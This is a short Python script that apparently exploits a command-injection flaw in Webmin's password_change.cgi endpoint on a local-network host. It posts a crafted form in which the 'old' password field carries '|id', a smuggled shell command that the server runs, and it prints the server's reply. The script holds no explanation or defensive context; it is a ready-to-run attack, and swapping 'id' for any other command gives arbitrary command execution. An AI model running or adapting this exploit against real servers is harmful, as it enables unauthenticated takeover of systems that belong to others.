import requests

url = "http://192.168.1.14:10000/password_change.cgi"

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
    "Referer": "https://192.168.1.14:10000/session_login.cgi",
    "Content-Type": "application/x-www-form-urlencoded",
}

data = "user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2"

response = requests.post(url, headers=headers, data=data)

print(response.text)
